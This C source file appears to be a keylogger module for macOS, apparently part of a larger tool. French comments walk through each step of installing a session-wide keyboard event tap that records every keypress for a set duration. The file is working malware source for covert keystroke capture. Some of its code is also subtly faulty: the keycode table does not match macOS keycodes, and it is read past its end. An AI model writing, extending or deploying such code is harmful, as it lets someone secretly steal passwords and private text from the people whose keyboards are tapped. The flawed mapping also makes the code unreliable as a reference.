#include <stdlib.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include "../../../include/keylog.h"

/* buffer où on stocke les touches capturées */
static char keylog_buffer[4096];
static int  keylog_pos = 0;

/*
 * EventCallback — macOS appelle cette fonction à chaque touche enfoncée
 * proxy  : identifiant interne macOS (on ne l'utilise pas)
 * type   : type d'événement (keydown, keyup...)
 * event  : l'événement lui-même, contient le keycode
 * refcon : données personnalisées qu'on aurait pu passer (on n'en a pas)
 */
static CGEventRef EventCallback(CGEventTapProxy proxy, CGEventType type,
                                 CGEventRef event, void *refcon)
{
    (void)proxy;
    (void)refcon;

    if (type == kCGEventKeyDown) {
        /* récupérer le code de la touche enfoncée */
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(
            event, kCGKeyboardEventKeycode);

        char key[16] = {0};

        /* les keycodes macOS ne sont pas des codes ASCII
         * on fait une correspondance manuelle pour les lettres courantes */
        const char *map = "asdfhjklzcvbnmqwertyuiop";
        if (keycode < 26)
            snprintf(key, sizeof(key), "%c", map[keycode]);
        else
            snprintf(key, sizeof(key), "[%d]", keycode); /* touches spéciales : Entrée, Espace... */

        /* ajouter la touche au buffer si il reste de la place */
        if (keylog_pos + (int)strlen(key) < (int)sizeof(keylog_buffer) - 1) {
            strcat(keylog_buffer, key);
            keylog_pos += strlen(key);
        }
    }

    /* obligatoire : laisser passer l'événement aux autres applications */
    return event;
}

/*
 * start_keylog — installe le hook clavier et capture pendant duration_seconds
 * retourne une string avec toutes les touches capturées
 */
char *start_keylog(int duration_seconds)
{
    /* remettre le buffer à zéro avant de commencer */
    memset(keylog_buffer, 0, sizeof(keylog_buffer));
    keylog_pos = 0;

    /* étape 1 : se présenter à macOS et installer le robinet
     * kCGSessionEventTap    = intercepter au niveau de toute la session
     * kCGHeadInsertEventTap = se mettre en premier dans la chaîne
     * kCGEventTapOptionDefault = on peut voir et modifier les events
     * CGEventMaskBit(kCGEventKeyDown) = uniquement les touches enfoncées
     * EventCallback = notre fonction hook
     */
    CFMachPortRef tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        CGEventMaskBit(kCGEventKeyDown),
        EventCallback,
        NULL
    );

    /* si tap est NULL, macOS a refusé (permissions Accessibilité non activées) */
    if (!tap)
        return "[keylog: active Accessibilite dans Preferences Systeme > Confidentialite]";

    /* étape 2 : convertir le tap en source que le RunLoop comprend (câble adaptateur) */
    CFRunLoopSourceRef src = CFMachPortCreateRunLoopSource(NULL, tap, 0);

    /* étape 3 : brancher la source dans le RunLoop actuel */
    CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes);

    /* étape 4 : allumer le robinet */
    CGEventTapEnable(tap, true);

    /* étape 5 : attendre ici pendant duration_seconds
     * pendant cette pause macOS peut appeler EventCallback à chaque frappe */
    CFRunLoopRunInMode(kCFRunLoopDefaultMode, duration_seconds, false);

    /* étape 6 : nettoyer dans l'ordre inverse */
    CGEventTapEnable(tap, false);            /* éteindre le robinet */
    CFRunLoopRemoveSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes); /* débrancher */
    CFRelease(src);                          /* libérer la mémoire du câble */
    CFRelease(tap);                          /* libérer la mémoire du robinet */

    return keylog_buffer;
}
